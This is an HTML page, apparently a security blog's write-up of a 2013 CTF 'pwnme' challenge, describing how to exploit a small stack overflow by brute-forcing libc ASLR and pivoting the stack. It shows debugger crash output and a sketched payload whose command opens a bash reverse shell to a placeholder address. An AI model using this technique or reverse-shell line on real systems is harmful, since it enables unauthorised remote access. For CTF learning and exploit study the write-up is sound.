@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>[Secuinside CTF 2013] pwnme writeup</title>
+  <meta name="description" content="Challenge summary:">
+  <link rel="stylesheet" href="/assets/bootstrap.css">
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html">
+  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
+  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
+  <script type="text/javascript" src="/assets/jquery.js"></script>
+  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
+  <script type="text/javascript">
+    // WebFont.load({
+    //     google: {
+    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
+    //     }
+    // });
+  </script>
+</head>
+
+    <body>
+        <div class="wrapper kopa-shadow">
+            <div class="row-fluid">
+                <header id="page-header">
+    <div class="clearfix" id="header-top">
+
+        <div class="kp-headline-wrapper clearfix">
+            <h6 class="kp-headline-title">Breaking news<span></span></h6>
+            <div class="kp-headline clearfix">
+                <dl class="ticker-1 clearfix">
+                    
+                    <dd>
+                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
+                    </dd>
+                    
+                </dl><!--ticker-1-->
+            </div><!--kp-headline-->
+        </div><!--kp-headline-wrapper-->
+
+        <div class="social-search-box">
+
+        </div>
+        <!--social-search-box-->
+
+    </div>
+    <!--header-top-->
+
+    <div class="clearfix" id="header-middle">
+        <div id="logo-image">
+            <a href="http://vnsec-new.cloudapp.net/wp">
+                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
+            </a>
+        </div>
+        <div class="top-banner">
+
+
+        </div>
+        <!--top-banner-->
+
+    </div>
+
+    <!--header-middle-->
+
+    <div id="header-bottom">
+        <nav id="main-nav">
+            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/">Home</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/headlines/">headlines</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/tutorials/">tutorials</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/research/">research</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/misc/">misc</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/papers.html">Papers</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/tools.html">Tools</a>
+                </li>
+            </ul>
+        </nav>
+        <!--main-nav-->
+    </div>
+    <div>
+        
+    </div>
+    <!--header-bottom-->
+</header>
+                <div id="main-content">
+                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">
+
+  <header class="post-header">
+    <h4 class="entry-title">[Secuinside CTF 2013] pwnme writeup</h4>
+    <p class="post-meta">May 28, 2013 • longld</p>
+  </header>
+
+  <article class="post-content">
+    <p>Challenge summary:</p>
+
+<p>Binary : http://war.secuinside.com/files/pwnme<br />
+Source : http://war.secuinside.com/files/pwnme.c<br />
+===================================<br />
+OS : Ubuntu 13.04 with PIE+ASLR+NX<br />
+md5 of libc-2.17.so : 45be45152ad28841ddabc5c875f8e6e4</p>
+
+<p>IP : 54.214.248.68<br />
+PORT : 8181,8282,8383</p>
+
+<p>This is the only exploit challenge comes with source. The bug is simple: buffer overflow with only 16-bytes at <em>pwnme.c:67</em>, just enough to control EIP. The goal is to bypass PIE+ASLR+NX. We first thought about information leak by overwriting one byte of saved EIP and looking for status. Unfortunately, this way soon becomes an dead end as socket was closed before returning at <em>pwnme.c:72</em>, so no more input, output can be provided to the program. Conclusion: we have to bruteforce for useful addresses, and due to binary is PIE bruteforcing for libc address the best way for code reuse. Luckily, ASLR on Ubuntu x86 is weak, the libc base address looks like 0xb7NNN000 with only 12-bits randomization. Server daemon will fork a child process for every coming connection, that means addresses will be the same for all instances and bruteforcing 12-bits only take 4096 tries at max. If server is fast, stable this can be done in few minutes, but in fact CTF game server was out of service for most of the time :).</p>
+
+<p>Now we can assume that libc is at fixed address, let build the payload. But where is my input buffer? It was zeroing out at <em>pwnme.c:71</em>, there must be something hidden. Let take a look at crash by sending a 1040 bytes pattern buffer:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb774b000 --&gt; 0x1aed9c
+ECX: 0x0
+EDX: 0xb774b000 --&gt; 0x1aed9c
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41397441 ('At9A')
+ESP: 0xbfac6ce0 --&gt; 0x1
+EIP: 0x75417375 ('usAu')
+EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x75417375
+[------------------------------------stack-------------------------------------]
+0000| 0xbfac6ce0 --&gt; 0x1
+0004| 0xbfac6ce4 --&gt; 0xbfac6d74 --&gt; 0xbfac78db ("./pwnme")
+0008| 0xbfac6ce8 --&gt; 0xbfac6d7c --&gt; 0xbfac78e3 ("TERM=xterm")
+0012| 0xbfac6cec --&gt; 0xb777a000 --&gt; 0x20f38
+0016| 0xbfac6cf0 --&gt; 0x20 (' ')
+0020| 0xbfac6cf4 --&gt; 0x0
+0024| 0xbfac6cf8 --&gt; 0xb77566f0 --&gt; 0xb759c000 --&gt; 0x464c457f
+0028| 0xbfac6cfc --&gt; 0x3
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x75417375 in ?? ()
+gdb-peda$ patts
+Registers contain pattern buffer:
+EIP+0 found at offset: 1036
+EBP+0 found at offset: 1032
+No register points to pattern buffer
+Pattern buffer found at:
+0xb7753000 : offset 1016 - size   24 (mapped)
+0xb7753023 : offset   27 - size  989 (mapped)
+0xbfac6cd0 : offset 1024 - size   16 ($sp + -0x10 [-4 dwords])
+References to pattern buffer found at:
+0xb774ba24 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba28 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba2c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba30 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba34 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba38 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba3c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xbfac6210 : 0xb7753000 ($sp + -0xad0 [-692 dwords])
+0xbfac6224 : 0xb7753000 ($sp + -0xabc [-687 dwords])
+0xbfac6248 : 0xb7753000 ($sp + -0xa98 [-678 dwords])
+0xbfac6254 : 0xb7753000 ($sp + -0xa8c [-675 dwords])
+0xbfac6294 : 0xb7753000 ($sp + -0xa4c [-659 dwords])
+0xbfac67c8 : 0xb7753000 ($sp + -0x518 [-326 dwords])
+0xbfac67d4 : 0xb7753000 ($sp + -0x50c [-323 dwords])
+0xbfac6814 : 0xb7753000 ($sp + -0x4cc [-307 dwords])
+gdb-peda$
+</pre>
+
+<p>Our input buffer is still there in non-stack memory starts at 0xb7753000, actually this is “stdout” buffer used in <em>printf()</em> at <em>pwnme.c:70</em>.</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ info symbol 0xb7753000
+No symbol matches 0xb7753000.
+gdb-peda$ info symbol 0xb774ba24
+_IO_2_1_stdout_ + 4 in section .data of /lib/i386-linux-gnu/tls/i686/nosegneg/libc.so.6
+</pre>
+
+<p>We can only assume that libc is fixed, if above buffer address is randomized things will become worse (means finding tedious ROP gadgets to pivot). Fortunately, that buffer is at fixed offset related to libc address.</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">gdb-peda$ vmmap libc
+Start      End        Perm    Name
+0xb759c000 0xb7749000 r-xp    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+0xb7749000 0xb774b000 r--p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+0xb774b000 0xb774c000 rw-p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+gdb-peda$ distance 0xb759c000 0xb7753000
+From 0xb759c000 to 0xb7753000: 1798144 bytes, 449536 dwords
+</pre>
+
+<p>Try to run the program several times to check and the offset is unchanged. We can build the payload now, the simplest one is calling <em>system()</em> with bash reverse shell, or you can try harder with full ROP payload (like what we did during the contest and wasted few more hours :)).</p>
+
+<p>Sample payload will look like:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">base = 0xb7500000 + bruteforce_value
+target = base + 1798144 + 0x304 # make enough space for fake stack
+cmd_ptr = target + some_offset # calculate it yourself
+cmd = "bash -c 'exec &gt;/dev/tcp/127.127.127.127/4444 0&lt;&amp;1';"
+payload = [ret ... ret, system, exit, cmd_ptr, cmd, padding] # total size = 1032
+payload += [target] # will become EBP
+payload += [leave_ret] # stack pivoting
+</pre>
+
+<p>Run it hundred of times and wait for a shell coming to your box.</p>
+
+  </article>
+
+</div>
+
+<hr/>
+<h2>Comments</h2>
+<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html" data-num-posts="4" data-width="706"></div>
+
+                </div>
+                <script type="text/javascript">
+jQuery(function() {
+    var _scroll = {
+        delay: 1000,
+        easing: 'linear',
+        items: 1,
+        duration: 0.07,
+        timeoutDuration: 0,
+        pauseOnHover: 'immediate'
+    };
+    jQuery('.ticker-1').carouFredSel({
+        width: 1000,
+        align: false,
+        items: {
+            width: 'variable',
+            height: 40,
+            visible: 1
+        },
+        scroll: _scroll
+    });
+
+    //  set carousels to be 100% wide
+    jQuery('.caroufredsel_wrapper').css('width', '100%');
+});
+</script>
+<script>
+  (function() {
+    var cx = '003844801333820630405:hlapfwpe2eq';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<gcse:search></gcse:search>
+<footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      
+    </div>
+
+  </div>
+
+</footer>
+
+            </div>
+        </div>
+        <script>(function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, "script", "facebook-jssdk"));</script>
+    </body>
+</html>
